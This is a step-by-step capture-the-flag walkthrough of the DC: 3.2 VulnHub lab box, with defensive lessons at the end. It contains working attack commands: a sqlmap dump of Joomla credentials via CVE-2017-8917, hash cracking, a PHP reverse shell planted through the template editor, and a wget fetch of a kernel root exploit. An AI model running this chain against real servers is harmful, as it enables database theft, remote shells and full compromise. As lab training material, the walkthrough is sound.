# DC: 3.2 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the third machine in
> the **DC** series by DCAU (released as "DC: 3", re-labelled **DC: 3.2**). It is
> intentionally vulnerable and must only ever be run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 3.2 |
| **Difficulty** | Beginner |
| **Author** | DCAU |
| **Released** | 25 April 2020 (this v3.2 build; original DC-3 shipped 26 March 2019) |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-32,312/> |
| **Download** | <https://vulnhub.com/entry/dc-32,312/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Ubuntu 16.04 32-bit (kernel 4.4), Apache 2.4.18 + Joomla 3.7.0 |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The author notes
> VirtualBox works best. The attack *chain* below is stable; small details (the
> exact kernel, an admin hash) may move around. When in doubt, re-run the
> enumeration yourself.

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to recognise a **Joomla** site and fingerprint its exact version.
- What a **SQL injection** is, using **CVE-2017-8917** (the Joomla `com_fields` bug) as the example.
- How to drive **sqlmap** to list databases, tables and rows, and pull a credential hash.
- How to crack a **bcrypt** hash with **john** / **hashcat**.
- How a convinced admin account turns into **remote code execution** via a template file.
- How to identify the OS/kernel from inside a shell and escalate to root with a **kernel exploit**.
- How to think like a defender and stop every one of the above.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own interface to learn the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network, so the target shares the first three numbers.

Sweep the subnet for live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and generally can't be hidden by a firewall.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

Unlike DC-1 and DC-2, this box exposes **only one service** — a single web server.

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:** `-p-` scans all TCP ports, `-sV` identifies service versions
> and `-sC` runs safe default scripts. There is exactly **one attack surface**: the
> **web server on port 80**, which the meta tag tells us is **Joomla**. Everything
> we do from here targets the web app.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Fingerprint Joomla

The version is exposed in a standard file that Joomla always ships:

```bash
curl -s http://192.168.56.101/administrator/manifests/files/joomla.xml | grep -i version
curl -s http://192.168.56.101/README.txt | head -n 3
```

```text
<version>3.7.0</version>
...
Joomla! ...
```

Kali ships **joomscan**, a Joomla-specific scanner that automates this:

```bash
joomscan -u http://192.168.56.101
```

```text
[+] Detecting Joomla Version ... 3.7.0
[+] Admin URL ... http://192.168.56.101/administrator/
[+] Check for known vulnerabilities ...
[!] Joomla! 3.7.0 - CVE-2017-8917 'com_fields' SQL Injection
```

> **Why it works:** `joomscan` reads the manifest XML, finds the admin login and
> cross-references the version against known CVEs. **Joomla 3.7.0** is vulnerable
> to **CVE-2017-8917**, a serious SQL injection introduced by the new `com_fields`
> component and fixed in 3.7.1.

### 2.3 The vulnerability — CVE-2017-8917 (`com_fields` SQLi)

Joomla 3.7.0 added a `com_fields` component whose `list[fullordering]` parameter is
placed into an SQL query **without proper escaping**. An unauthenticated remote
attacker can therefore inject SQL and read (or write) anything in the database —
including the administrator password hash. The vulnerable URL looks like:

```text
http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
```

> **Why it works:** `list[fullordering]` is meant to be a column name used to sort a
> list. Instead of validating it, Joomla concatenates it into the query, so we can
> attach our own SQL. Nmap even detects this automatically with
> `--script http-vuln-cve2017-8917`.

![Fingerprinting Joomla and the CVE](images/03-enum.png)

---

## 3. Foothold

### 3.1 Dump the database with sqlmap

We point **sqlmap** at the vulnerable parameter. The `*` marks where sqlmap should
test the injection.

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch --dbs
```

```text
[+] the back-end DBMS is MySQL
available databases [5]:
[*] information_schema
[*] joomladb          <-- the Joomla database
[*] mysql
[*] performance_schema
[*] sys
```

> **Why it works:** `--dbs` asks sqlmap to enumerate database names. It confirms the
> injection and shows us the database that matters: **`joomladb`**.

Now list its tables and find the user table:

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch -D joomladb --tables
```

```text
Database: joomladb
[76 tables]
+-------------------------+
| #__users                |   <-- the administrator accounts live here
| #__user_usergroup_map   |
| #__content              |
| ...                     |
+-------------------------+
```

> **Why it works:** `-D joomladb --tables` lists every table in that database.
> Joomla prefixes tables with `#__`, and `#__users` stores usernames and
> password hashes.

### 3.2 Extract the administrator hash

```bash
sqlmap -u "http://192.168.56.101/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
       --batch -D joomladb -T '#__users' -C id,username,password --dump
```

```text
Database: joomladb
Table: #__users
[1 entry]
+------+--------------------------------------------------------------+----------+
| id   | password                                                     | username |
+------+--------------------------------------------------------------+----------+
|  629 | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |
+------+--------------------------------------------------------------+----------+
```

> **Why it works:** `-T` selects the table, `-C` selects the columns and `--dump`
> prints the rows. The password is stored as a **bcrypt** hash — the `$2y$10$`
> prefix means "bcrypt, cost 10". Bcrypt hashes are salted and deliberately slow,
> but that only slows cracking; it does not prevent it.

**Alternative:** the `Joomblah` proof-of-concept does the same thing in one shot:

```bash
git clone https://github.com/XiphosResearch/exploits
python2 exploits/Joomblah/joomblah.py http://192.168.56.101
```

### 3.3 Crack the bcrypt hash

```bash
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```text
admin:snoopy
```

> **Why it works:** `john` recognises the `$2y$` bcrypt format automatically and
> tries every word in `rockyou.txt` as a potential password, re-hashing each with
> the stored salt and comparing. The password `snoopy` is in the list. With
> `hashcat` the equivalent command is
> `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`.

### 3.4 Log in and get a shell via a template

Log in to the Joomla administrator panel:

```text
http://192.168.56.101/administrator/
username: admin
password: snoopy
```

Once inside, an administrator can **edit the PHP of the site's templates**. We abuse
that to drop a PHP reverse shell:

1. Go to **Extensions → Templates → Templates**.
2. Open the **protostar** template, then open a writable PHP file (e.g. `error.php`),
   or use **New File** to create `shell.php`.
3. Replace the file contents with a PHP reverse shell — Kali ships one:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
# edit ~/shell.php: set $ip = '192.168.56.10' and $port = 4444
```

4. Paste it into the template editor and click **Save**.
5. Start a listener on Kali, then request the file in the browser.

```bash
nc -lvnp 4444
```

```bash
curl http://192.168.56.101/templates/protostar/shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48210
Linux dc-3 4.4.0-21-generic #37-Ubuntu SMP ... i686 GNU/Linux
www-data@dc-3:/var/www/html/templates/protostar$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the template file is served by Apache, which **executes** the PHP
> it contains. Because that PHP is our reverse shell, it connects back to Kali — and
> the web server runs it as its own account, `www-data`. Our first shell. (This box
> also has a known Metasploit module, `exploit/unix/webapp/joomla_comfields_sqli_rce`,
> which needs a logged-in admin — a good second technique to practise.)

Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)

---

## 4. Privilege escalation

### 4.1 Enumerate the local system

```bash
id
cat /etc/issue
uname -a
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Ubuntu 16.04 LTS \n \l
Linux dc-3 4.4.0-21-generic #37-Ubuntu SMP ... i686 GNU/Linux
```

> **Why it matters:** the box runs **Ubuntu 16.04** with an old **4.4 kernel**. Old
> kernels are prime targets for local privilege-escalation exploits. Before reaching
> for a kernel bug you should still check the "easy" wins:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

```text
(no sudo rights for www-data)
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec        (version 0.105 - not the vulnerable 0.101)
...
```

> **Why it works:** `sudo -l` shows nothing useful and the SUID list has no obvious
> escape (`pkexec` is the patched 0.105). That points us back to the **kernel**. Use
> `searchsploit ubuntu 16.04` to find candidates.

### 4.2 Kernel exploit — EDB 39772 (`doubleput`)

Exploit-DB **39772** is the "`double-fdput()` bpf(BPF_PROG_LOAD)" kernel
privilege-escalation exploit, which affects the 4.4 kernels in Ubuntu 16.04.

```bash
searchsploit -p 39772
```

Download the exploit bundle onto the target (it is a public PoC archive):

```bash
cd /tmp
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
```

> **Why it works:** the ZIP contains `exploit.tar`, which holds the compiled sources
> for the `ebpf_mapfd_doubleput_exploit` kernel bug. The exploit abuses a
> use-after-free (`double-fdput`) in the eBPF verifier to overwrite kernel memory
> and gain root.

Extract, compile and run it:

```bash
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

```text
...
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `compile.sh` builds the three small C programs and `doubleput`
> runs the attack, spawning a shell running as **root**. Kernel exploits are noisy
> and can occasionally crash the VM — if this one is unstable on your build, try a
> different Ubuntu 16.04 local exploit (see the References) or re-import the VM.
> "varies by build."

### The final flag

```bash
cd /root
ls
cat the-flag.txt
```

```text
The flag is: ... (well done!)
```

![Root shell and the final flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Outdated Joomla 3.7.0 | `http://192.168.56.101/` | Exposes a critical known SQL injection |
| 2 | `com_fields` SQL injection (CVE-2017-8917) | `index.php?...list[fullordering]=` | Unauthenticated read of the whole database |
| 3 | Weak administrator password (bcrypt crackable) | Joomla `#__users` table | Admin panel access (`admin:snoopy`) |
| 4 | Editable PHP in templates | Joomla admin → Template editor | Remote code execution as `www-data` |
| 5 | Unpatched Ubuntu 16.04 / 4.4 kernel | Local kernel (`ebpf doubleput`) | Local privilege escalation to root (EDB 39772) |

## 6. Defensive lessons (blue team)

- **Patch fast, patch often.** CVE-2017-8917 was fixed in Joomla 3.7.1. Subscribe to
  the Joomla Security News feed and update the core, extensions and templates.
- **Use parameterised queries.** The root cause is user input concatenated into SQL.
  Prepared statements (with bound parameters) prevent injection entirely.
- **Enforce strong admin passwords and MFA.** `snoopy` is in `rockyou.txt`; a long,
  unique passphrase plus MFA would have stopped the crack and the login.
- **Harden the admin panel.** IP-restrict `/administrator/`, rename it, and never
  allow PHP editing of templates in production (`disable_template_editing`).
- **Keep the OS and kernel current.** Reboot to apply kernel updates; unsupported
  releases (like 16.04) should be migrated, not left running.
- **Least privilege.** The web server should not be able to write PHP into served
  directories; run it in a sandbox/container with a read-only docroot where possible.
- **Detection ideas:** alert on long/odd `list[fullordering]` values and SQL keywords
  in web parameters (WAF + logs), on new `.php` files written under `templates/`,
  and on outbound connections from `www-data`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/dc-32,312/>
- CVE-2017-8917 (NVD): <https://nvd.nist.gov/vuln/detail/CVE-2017-8917>
- Joomla security centre — core SQL injection: <https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html>
- Exploit-DB 42033 — Joomla! 3.7.0 `com_fields` SQLi: <https://www.exploit-db.com/exploits/42033>
- Joomblah PoC: <https://github.com/XiphosResearch/exploits/tree/master/Joomblah>
- Rapid7 module — Joomla `com_fields` SQLi RCE: <https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce>
- Exploit-DB 39772 — Linux kernel `double-fdput()` BPF privilege escalation: <https://www.exploit-db.com/exploits/39772>
- Community writeups consulted:
  - [DC-3 Walkthrough — s1gh](https://s1gh.sh/vulnhub-dc-3/)
  - [DC-3 Walkthrough — Hacking Articles](https://www.hackingarticles.in/dc-3-walkthrough/)
  - [leegengyu/vulnhub-box-walkthrough (dc-3.md)](https://github.com/leegengyu/vulnhub-box-walkthrough/blob/master/dc-3.md)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — Nmap scan showing only the web server on port 80
- [ ] `images/03-enum.png` — Joomla 3.7.0 fingerprint / CVE-2017-8917
- [ ] `images/04-foothold.png` — sqlmap dump, cracked hash, reverse shell as `www-data`
- [ ] `images/05-root-flag.png` — kernel exploit root shell and `/root/the-flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
